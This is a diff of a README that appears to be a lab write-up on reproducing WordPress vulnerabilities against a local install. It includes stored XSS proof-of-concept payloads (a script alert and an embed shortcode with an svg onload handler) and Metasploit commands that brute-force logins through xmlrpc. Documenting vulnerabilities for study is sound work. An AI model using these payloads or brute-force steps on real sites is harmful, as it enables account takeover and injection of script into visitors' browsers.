@@ -21,8 +21,11 @@ References:
  ![](first_Vuln_.gif)
  
  Steps to recreate:
+ 
  1.Login as admin
+ 
  2.Create a post as authenticated user.
+ 
  3. Paste script>alert(xss)</script>
  
  ### 2. WordPress 2.8-4.7 - Accessibility Mode Cross-Site Request Forgery (CSRF)
@@ -51,9 +54,13 @@ References:
  - https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html
  
   Steps to recreate:
+  
  1.Login as admin
+ 
  2.Create a post as authenticated user.
+ 
  3. Change from visual tab to text tab 
+
 4. Paste [embed src='https://www.youtube.com/embed/1235689\x3csvg onload=alert(1)\x3e'][/embed]
  
 ![](four_Vuln_.gif)
@@ -61,19 +68,24 @@ References:
 ### 4. Username and password enumeration using metasploit 
  
 ![](third_Vuln_.gif)
+
 Steps to recreate 
+
 1. start up metsplsoit 
+
 2. Find correct payload, use following commands
    -search type:auxiliary wordpress xmlrpc
    -use auxiliary/scanner/http/wordpress_xmlrpc_login 
-4. Set target and conditions for payload
-   -setg RHOSTS 127.0.0.1
-   -set RPORT 8080
-   -set traget uri /
+  
+3. Set target and conditions for payload
+   - setg RHOSTS 127.0.0.1
+   - set RPORT 8080
+   - set traget uri /
    - set STOP_ON_SUCESS
    - set username/password or useneme/password  files (ex. set PASS_FILE password.txt)
    - set Httptrace TRUE
    - run
+ 
  If your files contain the correct username and password once matched the payload will stop running. 
 
    
